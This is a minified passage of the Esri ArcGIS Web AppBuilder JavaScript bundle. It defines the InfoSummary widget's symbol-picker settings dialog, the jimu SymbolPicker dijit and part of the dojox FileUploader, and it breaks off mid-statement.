// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/InfoSummary/setting/MySymbolPicker":function(){define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dijit/form/Select dijit/form/ValidationTextBox dojo/_base/lang dojo/_base/html dojo/dom-style dojo/dom-construct dojo/on dojo/dom dojox/gfx dojo/query dojo/_base/Color dijit/registry esri/symbols/jsonUtils esri/request esri/Color jimu/dijit/SymbolPicker jimu/BaseWidget jimu/dijit/TabContainer3 jimu/utils jimu/dijit/SimpleTable jimu/dijit/Message jimu/dijit/ColorPicker jimu/dijit/ImageChooser dojo/_base/array esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/PictureMarkerSymbol dojo/text!./MySymbolPicker.html dojo/Evented dojox/form/FileUploader".split(" "),
function(l,x,n,v,h,e,p,q,b,d,m,z,w,A,u,g,B,J,E,y,H,I,D,C,k,G,c,a,f,t,F){return l([E,x,F],{templateString:t,baseClass:"jimu-widget-InfoSummary-setting",nls:null,row:null,layerInfo:null,clusteringEnabled:null,symbolInfo:null,symbolType:"",map:null,supportsDynamic:!0,tabContainer:null,field_options:[],groupFeaturesEnabled:!1,lyrSymbolSet:[],_highLightColor:"#ffffff",panelHTML:null,svg:null,constructor:function(a){this.nls=a.nls;this.row=a.callerRow;this.layerInfo=a.layerInfo;this.renderer=a.layerInfo.renderer;
this.geometryType=a.layerInfo.geometryType;this.symbolInfo=a.symbolInfo;this.map=a.map;this.ac=a.ac;this.layerId=a.value;this.supportsDynamic=a.layerInfo.supportsDynamic;this.fields=a.layerInfo.fields;this.hidePanel=a.hidePanel;this.oidFieldName=a.layerInfo.oidFieldName;this.popupFields=[];if(a.layerInfo.infoTemplate&&a.layerInfo.infoTemplate.info&&(a=a.layerInfo.infoTemplate.info.fieldInfos))for(var r=0;r<a.length;r++)a[r].visible&&this.popupFields.push(a[r].fieldName)},postMixInProperties:function(){this.inherited(arguments);
this.nls.common=window.jimuNls.common},postCreate:function(){this.inherited(arguments);this._initImageChoosers();this._setFields(this.fields);this._initTabControl();this._initSymbolPickerTab(this.geometryType);this._initFeatureOptionsTab();if(this.hidePanel)e.removeClass(this.btnAddField,"btn-add-section"),e.addClass(this.btnAddField,"btn-add-section-disabled"),e.addClass(this.iconOptionsTextLabel,"text-disabled"),e.addClass(this.featureOptionsTextLabel,"text-disabled"),e.addClass(this.groupOptionsTextLabel,
"text-disabled"),e.addClass(this.chkGroupLabel,"text-disabled"),e.addClass(this.rdoLayerIconLabel,"text-disabled"),e.addClass(this.rdoCustomIconLabel,"text-disabled");else{this.own(b(this.btnAddField,"click",h.hitch(this,this._addFieldRow,this.fieldOptionsTable,"loSelect")));var a=this.fieldOptionsTable.getRows();a&&3<=a.length?(e.removeClass(this.btnAddField,"btn-add-section"),e.addClass(this.btnAddField,"btn-add-section-disabled")):(e.removeClass(this.btnAddField,"btn-add-section-disabled"),e.addClass(this.btnAddField,
"btn-add-section"));e.removeClass(this.iconOptionsTextLabel,"text-disabled");e.removeClass(this.featureOptionsTextLabel,"text-disabled");e.removeClass(this.groupOptionsTextLabel,"text-disabled");e.removeClass(this.chkGroupLabel,"text-disabled");e.removeClass(this.rdoLayerIconLabel,"text-disabled");e.removeClass(this.rdoCustomIconLabel,"text-disabled")}this.chkGroup.set("disabled",this.hidePanel);this.rdoLayerIcon.set("disabled",this.hidePanel);this.rdoCustomIcon.set("disabled",this.hidePanel)},_initImageChoosers:function(){this.imageIconChooser=
new k({format:[k.GIF,k.JPEG,k.PNG],cropImage:!1,showTip:!1,goldenWidth:10,goldenHeight:15});e.addClass(this.imageIconChooser.domNode,"uploadCustom");e.place(this.imageIconChooser.domNode,this.uploadCustomIcon,"replace");this.imageSymbolChooser=new k({format:[k.GIF,k.JPEG,k.PNG],cropImage:!1,showTip:!1,goldenWidth:10,goldenHeight:15});e.addClass(this.imageSymbolChooser.domNode,"uploadCustom");e.place(this.imageSymbolChooser.domNode,this.uploadCustomSymbol,"replace")},_setFields:function(a){if(a){this.field_options=
[];for(var r=[""," ",void 0,null],c=0;c<a.length;c++)this.field_options.push({value:a[c].name,label:-1===r.indexOf(a[c].alias)?a[c].alias:a[c].name})}},_initTabControl:function(){this.tabContainer=new y({tabs:[{title:this.nls.symbolOptions,content:this.symbolPickerContainer},{title:this.nls.panelFeatureDisplay,content:this.panelFeatureDisplayContainer}],isNested:!0},this.tabParent);this.tabContainer.startup()},_initSymbolPickerTab:function(a){a=H.getTypeByGeometryType(a);this._loadLayerSymbol();this.supportsDynamic&&
this._initSymbolPicker(a);this._initClusterSymbolPicker(a);this._addEventHandlers(a);this._initSymbolUI()},_initFeatureOptionsTab:function(){this.isInitalLoad=!0;this.fieldLoadCount=0;this.fieldOptionsTable=new I({fields:[{name:"field",title:this.nls.selectField,"class":"label",type:"empty",width:"100px"},{name:"label","class":"label",title:this.nls.fieldLabel,type:"empty",width:"100px"},{name:"actions","class":"label",title:this.nls.actions,type:"actions",actions:["up","down","delete"],width:"50px"}],
selectable:!1,autoHeight:!0});this.fieldOptionsTable.placeAt(this.fieldOptions);this.fieldOptionsTable.startup();this.fieldOptionsTable.on("row-delete",h.hitch(this,this._rowDeleted));this.groupOptionsTable=new I({fields:[{name:"field",title:this.nls.selectField,"class":"label",type:"empty",width:"180px"},{name:"label","class":"label",title:this.nls.fieldLabel,type:"empty",width:"140px"}],selectable:!1,autoHeight:!0});this.groupOptionsTable.placeAt(this.groupFieldOptions);this.groupOptionsTable.startup();
this._initFeatureOptionsUI();this.isInitalLoad=!1},_initFeatureOptionsUI:function(){var a;this.symbolInfo&&this.symbolInfo.featureDisplayOptions&&(a=this.symbolInfo.featureDisplayOptions);if(a&&a.fields)for(var c=0;c<a.fields.length;c++)this._populateLayerRow(this.fieldOptionsTable,a.fields[c],"loSelect");else if(this._addFieldRow(this.groupOptionsTable,"goSelect"),this.popupFields&&0<this.popupFields.length)for(var c=2<this.popupFields.length?3:this.popupFields.length,f=0;f<c;f++)this._populateLayerRow(this.fieldOptionsTable,
{name:this.popupFields[f]},"loSelect");this.groupFeaturesEnabled=a&&"undefined"!==typeof a.groupEnabled?a.groupEnabled:!1;this._chkGroupChanged(this.groupFeaturesEnabled);this.chkGroup.set("checked",this.groupFeaturesEnabled);a&&a.groupField&&this._populateLayerRow(this.groupOptionsTable,a.groupField,"goSelect");c=!0;a&&"undefined"!==typeof a.groupByField&&(this._rdoGroupByFieldChanged(a.groupByField),c=!1);f=!1;this.renderer&&(this.renderer.attributeField||this.renderer.field||this.renderer.field1)&&
"undefined"===typeof this.renderer.visualVariables&&(f=!0);f||p.set(this.grpRenderer,"display","none");a&&"undefined"!==typeof a.groupByRenderer&&(this._rdoGroupByRendererChanged(a.groupByRenderer),c=!1);c&&this._rdoGroupByFieldChanged(c)},_rowDeleted:function(a){3>this.fieldOptionsTable.getRows().length&&(e.removeClass(this.btnAddField,"btn-add-section-disabled"),e.addClass(this.btnAddField,"btn-add-section"))},_populateLayerRow:function(a,c,f){this.fieldLoadCount+=1;a=a.addRow({});a.success&&a.tr&&
(a=a.tr,this._addFieldsOption(a,f),this._addLabelOption(a),a.selectFields.set("value",c.name),a.labelText.set("value",c.label))},_addFieldRow:function(a,c){if(a===this.fieldOptionsTable&&3<=a.getRows().length)new D({message:this.nls.max_records});else{this.isInitalLoad=!1;var r=a.addRow({});r.success&&r.tr&&(r=r.tr,this._addFieldsOption(r,c),this._addLabelOption(r));a===this.fieldOptionsTable&&3<=a.getRows().length&&(e.removeClass(this.btnAddField,"btn-add-section"),e.addClass(this.btnAddField,"btn-add-section-disabled"))}},
_addFieldsOption:function(a,c){var r=h.clone(this.field_options),f=z(".simple-table-cell",a)[0];f&&(e.setStyle(f,"verticalAlign","middle"),e.setStyle(f,"line-height","inherit"),c=new n({style:{width:"100%",height:"28px"},"class":c,options:r}),c.placeAt(f),c.startup(),a.selectFields=c,this.own(b(c,"change",h.hitch(this,function(){this.fieldLoadCount&&0<this.fieldLoadCount?--this.fieldLoadCount:a.labelText.set("value","");a.cells[0].title=a.cells[0].innerText}))),a.cells[0].title=a.cells[0].innerText)},
_addLabelOption:function(a){var c=z(".simple-table-cell",a)[1];e.setStyle(c,"verticalAlign","middle");e.setStyle(c,"line-height","inherit");var f=new v({style:{width:"100%",height:"28px"}});f.placeAt(c);f.startup();a.labelText=f},_initSymbolUI:function(){"undefined"!==typeof this.symbolInfo?(this.symbolType=this.symbolInfo.symbolType,this.clusterType=this.symbolInfo.clusterType,this.iconType=this.symbolInfo.iconType,this.displayFeatureCount=this.symbolInfo.displayFeatureCount,this.clusteringEnabled=
this.symbolInfo.clusteringEnabled,this.userDefinedSymbol=this.symbolInfo.userDefinedSymbol,this._highLightColor=this.symbolInfo._highLightColor,this._setSymbolType(this.symbolInfo.symbolType),this._setClusterType(this.symbolInfo.clusterType),this._setIconType(this.symbolInfo.iconType),"undefined"!==typeof this.symbolInfo.clusterType&&("CustomCluster"===this.symbolInfo.clusterType&&this.symbolInfo.clusterSymbol&&this.clusterPicker.showBySymbol(u.fromJson(this.symbolInfo.clusterSymbol)),this.userDefinedSymbol=
!0),this.chkClusterSym.set("checked",this.symbolInfo.clusteringEnabled),this._chkClusterChanged(this.symbolInfo.clusteringEnabled)):(this.rdoLayerSym.set("checked",!0),this._rdoEsriSymChanged(!1),this._rdoCustomSymChanged(!1),this.chkClusterSym.set("checked",!1),this.chkClusterCnt.set("checked",!1),this.rdoLayerIcon.set("checked",!0),this._rdoCustomIconChanged(!1),this.symbolType="LayerSymbol",this.iconType="LayerIcon",this.userDefinedSymbol=this.clusteringEnabled=!1);"esriGeometryPoint"===this.geometryType&&
this.supportsDynamic||(p.set(this.parent_div_uploadCustomSymbol,"display","none"),this.supportsDynamic||p.set(this.div_rdoEsriSym,"display","none"))},_setSymbolType:function(a){switch(a){case "LayerSymbol":this.symbolInfo.symbolOverride?(this.userDefinedSymbol=!0,this.rdoEsriSym.set("checked",!0),this._rdoLayerSymChanged(!1),this._rdoCustomSymChanged(!1),this.symbolPicker.showBySymbol(u.fromJson(this.symbolInfo.symbol))):(this.rdoLayerSym.set("checked",!0),this._rdoEsriSymChanged(!1),this._rdoCustomSymChanged(!1));
break;case "EsriSymbol":this.userDefinedSymbol=!0;this.rdoEsriSym.set("checked",!0);this._rdoLayerSymChanged(!1);this._rdoCustomSymChanged(!1);this.symbolPicker.showBySymbol(u.fromJson(this.symbolInfo.symbol));break;case "CustomSymbol":this.userDefinedSymbol=!0,this.rdoCustomSym.set("checked",!0),this._rdoEsriSymChanged(!1),this._rdoLayerSymChanged(!1),this._createImageDataDiv(this.symbolInfo.symbol,!0,this.customSymbolPlaceholder)}},_setIconType:function(a){switch(a){case "LayerIcon":this.rdoLayerIcon.set("checked",
!0);break;case "CustomIcon":this.userDefinedSymbol=!0,this.rdoCustomIcon.set("checked",!0),this.symbolInfo.icon&&(this.updateImg(),a=u.fromJson(this.symbolInfo.icon),this._createImageDataDiv(a,!0,this.customIconPlaceholder))}},_setClusterType:function(a){switch(a){case "ThemeCluster":this.userDefinedSymbol=!0;this.clusterType="ThemeCluster";break;case "CustomCluster":this.userDefinedSymbol=!0,this.clusterType="CustomCluster",this.chkClusterCnt.set("checked",this.displayFeatureCount),this.colorPicker.setColor(new w(this._highLightColor))}},
updateImg:function(){if(-1<this.symbolInfo.icon.toString().indexOf("\x3cimg")){var a=document.createElement("div");a.innerHTML=this.symbolInfo.icon;var c=new f(a.children[0].src,26,26);this.symbolInfo.icon=c.toJson();a.remove()}},_addEventHandlers:function(a){"point"===a&&this.own(b(this.imageSymbolChooser,"ImageChange",h.hitch(this,function(a){this.uploadImage("Symbol",a)})));this.own(b(this.imageIconChooser,"ImageChange",h.hitch(this,function(a){this.uploadImage("Icon",a)})));this.btnOk.innerText=
this.nls.common.ok;this.own(b(this.btnOk,"click",h.hitch(this,function(){this._setSymbol();this.emit("ok",this.symbolInfo)})));this.btnCancel.innerText=this.nls.common.cancel;this.own(b(this.btnCancel,"click",h.hitch(this,function(){this.emit("cancel")})))},_setSymbol:function(){var a;switch(this.symbolType){case "LayerSymbol":a=this.symbol;break;case "EsriSymbol":this.userDefinedSymbol=!0;a=this.symbolPicker.getSymbol();break;case "CustomSymbol":this.userDefinedSymbol=!0,0<this.customSymbolPlaceholder.children.length&&
(a="undefined"!==typeof this.customSymbolPlaceholder.children[0].src?new f(this.customSymbolPlaceholder.children[0].src,26,26):u.fromJson(this.symbolInfo.symbol))}var c;"LayerIcon"===this.iconType?c=a:0<this.customIconPlaceholder.children.length&&("undefined"!==typeof this.customIconPlaceholder.children[0].src?(e.removeClass(this.customIconPlaceholder.firstChild,"customPlaceholder"),e.addClass(this.customIconPlaceholder.firstChild,"customPlaceholderSettings"),c=new f(this.customIconPlaceholder.children[0].src,
26,26)):c=u.fromJson(this.symbolInfo.icon));this.clusteringEnabled&&"esriGeometryPoint"===this.geometryType?(this.clusterSymbol="ThemeCluster"===this.clusterType?"custom":this.clusterPicker.getSymbol().toJson(),this.userDefinedSymbol=!0):(this.clusterSymbol=void 0,this.clusteringEnabled=!1);a&&"undefined"!==typeof a.toJson&&(a=a.toJson());var g;g=0<this.customIconPlaceholder.children.length?this.customIconPlaceholder.children[0].src:0<this.layerSym.children.length?this.layerSym.children[0].innerHTML:
this.customIconPlaceholder.outerHTML;if("undefined"!==typeof c){var t="LayerIcon"!==this.iconType||"CustomSymbol"===this.symbolType;this._createImageDataDiv2(c,44,44,!0,t);this._createImageDataDiv2(c,28,28,!1,t)}var F;if("undefined"!==typeof this.ren)for(F=[],t=0;t<this.ren.length;t++){var b=this.ren[t],d,B,k;if("undefined"!==typeof b.value)B=isNaN(b.value)?"'"+b.value+"'":b.value,d="undefined"!==typeof b.label?b.label:b.value,B="undefined"!==typeof B?" \x3d\x3d\x3d "+B:void 0,k="undefined"!==typeof b.description&&
""!==b.description?b.description:void 0;else if("undefined"!==typeof b.classMaxValue){d=b.label;var h;d&&(h=d.split(" - "));h&&(B=1<h.length?" \x3e\x3d "+h[0]+" \x26\x26 \x3c\x3d "+h[1]:" \x3d\x3d\x3d "+h[0]);k="undefined"!==typeof b.description&&""!==b.description?b.description:void 0}F.push({value:B,label:d,description:k})}d=[];this.renderer&&this.renderer.attributeField?(d.push({name:this.renderer.attributeField}),this.renderer.attributeField2&&d.push({name:this.renderer.attributeField2}),this.renderer.attributeField3&&
d.push({name:this.renderer.attributeField3})):this.renderer&&this.renderer.field?d.push({name:this.renderer.field}):this.renderer&&this.renderer.field1&&d.push({name:this.renderer.field1});h=this.fieldOptionsTable?this._getFields(this.fieldOptionsTable):null;this.symbolInfo={symbolType:this.symbolType,symbol:a,clusterSymbol:this.clusterSymbol,clusteringEnabled:this.clusteringEnabled,displayFeatureCount:this.displayFeatureCount,_highLightColor:this.colorPicker.color.toHex(),icon:c&&c.toJson?c.toJson():
c,clusterType:this.clusterType,iconType:this.iconType,renderer:this.renderer,s:g,svg:this.svg,panelHTML:this.panelHTML,userDefinedSymbol:this.userDefinedSymbol?this.userDefinedSymbol:!1,layerId:this.layerId,selectedId:this.selectedID,featureDisplayOptions:{groupEnabled:this.groupFeaturesEnabled,listDisabled:h&&0<h.length?!1:!0,groupByRenderer:"undefined"===typeof this.groupByRenderer?!1:this.groupByRenderer,groupByField:"undefined"===typeof this.groupByField?!1:this.groupByField,fields:h,groupField:this.groupOptionsTable?
this._getFields(this.groupOptionsTable)[0]:null,groupByRendererOptions:{fields:d,values:F}}}},_getFields:function(a){a=a.getRows();var c=[];G.forEach(a,function(a){a.selectFields&&c.push({name:a.selectFields.value,label:a.labelText.value})});return c},_rdoLayerSymChanged:function(a){a&&(this.symbolType="LayerSymbol",this.selectedID&&this.setLayerSymbol(d.byId(this.selectedID)));e.setStyle(this.layerSym,"display",a?"block":"none")},_rdoEsriSymChanged:function(a){a&&(this.symbolType="EsriSymbol");e.setStyle(this.symbolPicker.domNode,
"display",a?"block":"none")},_rdoCustomSymChanged:function(a){a&&(this.symbolType="CustomSymbol");e.setStyle(this.customSymbolDIV,"display",a?"block":"none")},_chkClusterChanged:function(a){this.clusteringEnabled=a;e.setStyle(this.grpClusterOptions,"display",a?"block":"none");e.setStyle(this.featureFont,"display",a?"block":"none");e.setStyle(this.clusterPickerContainer,"display",a?"block":"none");a&&"undefined"===typeof this.clusterType&&(this.clusterType="CustomCluster")},_chkClusterCntChanged:function(a){this.displayFeatureCount=
a;e.setStyle(this.featureFont,"display",a&&this.clusteringEnabled?"block":"none")},_rdoLayerIconChanged:function(a){a&&(this.iconType="LayerIcon");e.setStyle(this.imageIconChooser.domNode,"display",a?"none":"block");e.setStyle(this.customIconPlaceholder,"display",a?"none":"block")},_rdoCustomIconChanged:function(a){a&&(this.iconType="CustomIcon");e.setStyle(this.imageIconChooser.domNode,"display",a?"block":"none");e.setStyle(this.customIconPlaceholder,"display",a?"block":"none")},_initSymbolPicker:function(a){this.symbolPicker.showByType("point"===
a?"marker":"polyline"===a?"line":"polygon"===a?"fill":"")},_initClusterSymbolPicker:function(a){"point"===a&&this.clusterPicker.showByType("fill");p.set(this.parent_div_clusterOptions,"display","point"===a?"block":"none")},_loadLayerSymbol:function(){this.ren=this.infos=void 0;if("undefined"!==typeof this.renderer){var f=this.renderer,g;if("undefined"!==typeof f.symbol)this._createImageDataDiv(f.symbol,!0,this.layerSym);else if("undefined"!==typeof f.infos)g=f.infos;else if("undefined"!==typeof f.uniqueValueInfos)g=
f.uniqueValueInfos;else if("undefined"!==typeof f.classBreakInfos)g=f.classBreakInfos;else if(f.type&&"heatmap"===f.type&&f.colorStops){var f=f.colorStops,t=[];if(f&&1<=f.length){var b=f[0].color,b=B.fromArray([b.r,b.g,b.b]);t.push({symbol:new c(c.STYLE_CIRCLE,10,new a(a.STYLE_SOLID,b),b)});2<f.length&&(b=f[f.length-1].color,b=B.fromArray([b.r,b.g,b.b]),t.push({symbol:new c(c.STYLE_CIRCLE,10,new a(a.STYLE_SOLID,b),b)}))}this.infos=t;0<t.length?this.layerSym.appendChild(this._createCombinedImageDataDiv(t)):
(this._createImageDataDiv2(void 0,44,44,!0,!1),this._createImageDataDiv2(void 0,28,28,!1,!1))}else this.rdoEsriSym.set("checked",!0),this.symbolType="EsriSymbol",this.iconType="LayerIcon",this._initSymbolPicker(H.getTypeByGeometryType(this.geometryType)),this._setFields(this.fields),this._setSymbol(),this.symbolInfo.symbolType="LayerSymbol",this.symbolInfo.symbolOverride=!0;g&&(this.ren=g,this.layerSym.innerHTML="\x3cdiv\x3e\x3c/div\x3e",this.layerSym.appendChild(this._createCombinedImageDataDiv(g)),
e.setStyle(this.layerSym,"cursor","pointer"))}},_createImageDataDiv2:function(a,c,f,g,t){var b;if("string"===typeof a)b=q.create("div",{"class":"imageDataGFX",innerHTML:a}),g?this.panelHTML=b.innerHTML:this.svg=b;else if("undefined"===typeof a)b=q.create("div",{"class":"imageDataGFX"}),b.innerHTML="\x3cdiv\x3e\x3c/div\x3e",g?this.panelHTML=b.innerHTML:this.svg=b;else{var r=u.fromJson(a);r||(r=a);r?(a=f,f=c,r.height&&r.width&&(b=r.width/r.height,r.height>r.width?f=c*b:r.width>r.height&&(a=f/b)),"undefined"!==
typeof r.setWidth?"undefined"!==typeof r.setHeight?(r.setWidth(t?f-.25*f:f),r.setHeight(t?a-.25*a:a)):r.setWidth(2):"undefined"!==typeof r.size&&20<r.size&&r.setSize(20),b=q.create("div",{"class":"imageDataGFX"}),c=m.createSurface(b,f,a),r=u.getShapeDescriptors(r),c.createShape(r.defaultShape).setFill(r.fill).setStroke(r.stroke).applyTransform({dx:f/2,dy:a/2}),g?this.panelHTML=b.innerHTML:this.svg=b):"undefined"!==typeof a.url&&(b=q.create("div",{"class":"imageDataGFX"}),p.set(b,"background-image",
"url("+a.url+")"),p.set(b,"background-repeat","no-repeat"),g?this.panelHTML=b.innerHTML:this.svg=b)}return b},_createImageDataDiv:function(a,c,f){f=q.create("div",{"class":"imageDataGFX-display"},f);(c=c?u.fromJson(a):a)||(c=a);this.symbol=c;var g=a=26;c.height&&c.width&&c.height>c.width&&(g=c.width/c.height,a=26,g*=26);var b=m.createSurface(f,g,a);c=u.getShapeDescriptors(this.setSym(c,g,a));b.createShape(c.defaultShape).setFill(c.fill).setStroke(c.stroke).applyTransform({dx:g/2,dy:a/2});this.svg=
f.firstChild;return f},_createCombinedImageDataDiv:function(a){var c=q.create("div",{"class":"imageDataGFXMulti"},this.customSymbolPlaceholder);this.lyrSymbolSet=[];for(var f=this.symbolInfo&&this.symbolInfo.selectedId?!1:!0,g=0;g<a.length;g++){var b=a[g].symbol,t=u.fromJson(b);t||(t=b);"undefined"===typeof this.symbol&&(this.symbol=t);this.lyrSymbolSet.push(t);var r=b=26;t.height&&t.width&&t.height>t.width&&(r=t.width/t.height,b=26,r*=26);var d=q.create("div",{"class":"imageDataGFX imageDataGFX2",
id:"imageGFX_"+g,onclick:h.hitch(this,this.layerSymbolClick)},c),F=m.createSurface(d,r,b),t=u.getShapeDescriptors(this.setSym(t,r,b));F.createShape(t.defaultShape).setFill(t.fill).setStroke(t.stroke).applyTransform({dx:r/2,dy:b/2});c.insertBefore(d,c.firstChild);c.appendChild(d);if(f||this.symbolInfo&&d.id===this.symbolInfo.selectedId)this.setLayerSymbol(d),f=!1;F.rawNode&&(e.setStyle(F.rawNode,"display","block"),e.setStyle(F.rawNode,"margin","auto"))}return c},layerSymbolClick:function(a){this.setLayerSymbol(a.currentTarget)},
setLayerSymbol:function(a){for(var c,f=0;f<a.parentElement.children.length;f++){var g=a.parentElement.children[f];e.removeClass(g,"lyrSymbolSelected");g.id===a.id&&(c=f)}e.addClass(a,"lyrSymbolSelected");this.selectedID=a.id;this.svg=a;this.panelHTML=a.innerHTML;this.symbol=this.lyrSymbolSet[c]},setSym:function(a,c,f){"undefined"!==typeof a.setWidth?("esriGeometryPoint"===this.geometryType&&a.setWidth(c),"undefined"!==typeof a.setHeight&&a.setHeight(f)):("undefined"!==typeof a.size&&20<a.size&&a.setSize(20),
"undefined"!==typeof a.width&&(a.width=c),"undefined"!==typeof a.height&&(a.height=f));return a},uploadImage:function(a,c){var f="Symbol"===a?this.customSymbolPlaceholder:this.customIconPlaceholder;f.innerHTML="";f.innerHTML=q.create("div",{"class":"customPlaceholder",innerHTML:['\x3cimg class\x3d"customPlaceholder" src\x3d"',c,'"/\x3e'].join(""),title:"Symbol"===a?this.nls.editCustomSymbol:this.nls.editCustomIcon}).innerHTML},_chkGroupChanged:function(a){this.groupFeaturesEnabled=a;e.setStyle(this.groupByOptions,
"display",a?"inline-block":"none")},_rdoGroupByFieldChanged:function(a){this.groupByField=a;this.rdoGroupField.set("checked",a);e.setStyle(this.groupFieldOptions,"display",a?"inline-block":"none")},_rdoGroupByRendererChanged:function(a){this.groupByRenderer=a;this.rdoGroupRenderer.set("checked",a)},destroy:function(){this.symbolInfo=null;this.tabContainer.destroyRecursive()}})})},"jimu/dijit/SymbolPicker":function(){define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query dijit/TooltipDialog dijit/popup dijit/registry jimu/dijit/SymbolChooser jimu/symbolUtils".split(" "),
function(l,x,n,v,h,e,p,q,b,d,m,z,w,A){return l([x,n,v],{baseClass:"jimu-symbol-picker",declaredClass:"jimu.dijit.SymbolPicker",templateString:'\x3cdiv\x3e\x3cdiv data-dojo-attach-point\x3d"symbolNode" class\x3d"symbol-node jimu-float-leading"\x3e\x3c/div\x3e\x3cdiv class\x3d"separator jimu-float-leading"\x3e\x3c/div\x3e\x3cdiv class\x3d"jimu-icon jimu-icon-down-arrow-8 jimu-float-leading"\x3e\x3c/div\x3e\x3c/div\x3e',tooltipDialog:null,_isTooltipDialogOpened:!1,symbol:null,type:null,postCreate:function(){this.inherited(arguments);
this._createTooltipDialog();this._hideTooltipDialog();var b=this.symbolChooser.getSymbol();b&&this._drawSymbol(b)},destroy:function(){this._hideTooltipDialog();this.symbolChooser&&this.symbolChooser.destroy();this.symbolChooser=null;this.inherited(arguments)},_createTooltipDialog:function(){var b=e.create("div");this.tooltipDialog=new d({content:b});this.symbolChooser=new w({symbol:this.symbol,type:this.type});this.symbolChooser.placeAt(b);this.symbolChooser.startup();this.own(q(this.symbolChooser,
"change",h.hitch(this,function(b){this._drawSymbol(b);this.emit("change",b)})));this.own(q(this.domNode,"click",h.hitch(this,function(b){b.stopPropagation();b.preventDefault();this._isTooltipDialogOpened?this._hideTooltipDialog():this._showTooltipDialog()})));this.own(q(document.body,"click",h.hitch(this,function(b){var g=b.target||b.srcElement;b=this._getColorPickers();0<b.length&&p.some(b,function(b){return b.isPartOfPopup(g)})||(b=this.tooltipDialog.domNode,g===b||e.isDescendant(g,b)||this._hideTooltipDialog())})));
this.own(q(this.symbolChooser,"resize",h.hitch(this,function(){this._isTooltipDialogOpened&&(this._hideTooltipDialog(),this._showTooltipDialog())})))},_getColorPickers:function(){var d=b(".jimu-color-picker",this.symbolChooser.domNode);return p.map(d,h.hitch(this,function(b){return z.byNode(b)}))},reset:function(){this.symbol=this.type=null;e.empty(this.symbolNode);this.symbolChooser.reset()},showBySymbol:function(b){this.reset();b&&(this._drawSymbol(b),this.symbolChooser.showBySymbol(b))},showByType:function(b){this.reset();
this.symbolChooser.showByType(b);(b=this.symbolChooser.getSymbol())&&this._drawSymbol(b)},getSymbol:function(){return this.symbolChooser.getSymbol()},_drawSymbol:function(b){e.empty(this.symbolNode);b&&(b=A.createSymbolNode(b,{width:16,height:16}))&&e.place(b,this.symbolNode)},_showTooltipDialog:function(){this.tooltipDialog&&(m.open({parent:this.getParent(),popup:this.tooltipDialog,around:this.domNode}),this._isTooltipDialogOpened=!0)},_hideTooltipDialog:function(){this.tooltipDialog&&(m.close(this.tooltipDialog),
this._isTooltipDialogOpened=!1)}})})},"dojox/form/FileUploader":function(){define("dojo/_base/kernel dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/connect dojo/_base/window dojo/_base/sniff dojo/query dojo/dom dojo/dom-style dojo/dom-geometry dojo/dom-attr dojo/dom-class dojo/dom-construct dojo/dom-form dojo/_base/config dijit/_base/manager dojo/io/iframe dojo/_base/Color dojo/_base/unload dijit/_Widget dijit/_TemplatedMixin dijit/_Contained dojox/embed/Flash dojox/embed/flashVars dojox/html/styles".split(" "),
function(l,x,n,v,h,e,p,q,b,d,m,z,w,A,u,g,B,J,E,y,H,I,D,C,k,G){l.deprecated("dojox.form.FileUploader","Use dojox.form.Uploader","2.0");return x("dojox.form.FileUploader",[H,I,D],{swfPath:g.uploaderPath||require.toUrl("dojox/form/resources/fileuploader.swf"),templateString:'\x3cdiv\x3e\x3cdiv dojoAttachPoint\x3d"progNode"\x3e\x3cdiv dojoAttachPoint\x3d"progTextNode"\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv dojoAttachPoint\x3d"insideNode" class\x3d"uploaderInsideNode"\x3e\x3c/div\x3e\x3c/div\x3e',uploadUrl:"",
isDebug:!1,devMode:!1,baseClass:"dojoxUploaderNorm",hoverClass:"dojoxUploaderHover",activeClass:"dojoxUploaderActive",disabledClass:"dojoxUploaderDisabled",force:"",uploaderType:"",flashObject:null,flashMovie:null,insideNode:null,deferredUploading:1,fileListId:"",uploadOnChange:!1,selectMultipleFiles:!0,htmlFieldName:"uploadedfile",flashFieldName:"flashUploadFiles",fileMask:null,minFlashVersion:9,tabIndex:-1,showProgress:!1,progressMessage:"Loading",progressBackgroundUrl:require.toUrl("dijit/themes/tundra/images/buttonActive.png"),
progressBackgroundColor:"#ededed",progressWidgetId:"",skipServerCheck:!1,serverTimeout:5E3,log:function(){this.isDebug&&console.log(Array.prototype.slice.call(arguments).join(" "))},constructor:function(){this._subs=[]},postMixInProperties:function(){this.fileList=[];this._cons=[];this.fileMask=this.fileMask||[];this.fileInputs=[];this.fileCount=0;this._disabled=this.flashReady=!1;this.force=this.force.toLowerCase();this.uploaderType=(C.available>=this.minFlashVersion||"flash"==this.force)&&"html"!=
this.force?"flash":"html";this.deferredUploading=!0===this.deferredUploading?1:this.deferredUploading;this._refNode=this.srcNodeRef;this.getButtonStyle()},startup:function(){},postCreate:function(){this.inherited(arguments);this.setButtonStyle();var c;"flash"==this.uploaderType?c="createFlashUploader":(this.uploaderType="html",c="createHtmlUploader");this[c]();this.fileListId&&this.connect(b.byId(this.fileListId),"click",function(a){a=a.target.parentNode.parentNode.parentNode;a.id&&-1<a.id.indexOf("file_")&&
this.removeFile(a.id.split("file_")[1])});y.addOnUnload(this,this.destroy)},getHiddenNode:function(c){if(!c)return null;var a=null;for(c=c.parentNode;c&&"body"!=c.tagName.toLowerCase();){if("none"==d.get(c,"display")){a=c;break}c=c.parentNode}return a},getButtonStyle:function(){var c=this.srcNodeRef;(this._hiddenNode=this.getHiddenNode(c))&&d.set(this._hiddenNode,"display","block");if(!c&&this.button&&this.button.domNode){var a=!0,c=this.button.domNode.className+" dijitButtonNode",f=this.getText(q(".dijitButtonText",
this.button.domNode)[0]);this.srcNodeRef=c=A.place('\x3cbutton id\x3d"'+this.button.id+'" class\x3d"'+c+'"\x3e'+f+"\x3c/button\x3e",this.button.domNode,"after");this.button.destroy();this.baseClass="dijitButton";this.hoverClass="dijitButtonHover";this.pressClass="dijitButtonActive";this.disabledClass="dijitButtonDisabled"}else!this.srcNodeRef&&this.button&&(c=this.button);z.get(c,"class")&&(this.baseClass+=" "+z.get(c,"class"));z.set(c,"class",this.baseClass);this.norm=this.getStyle(c);this.width=
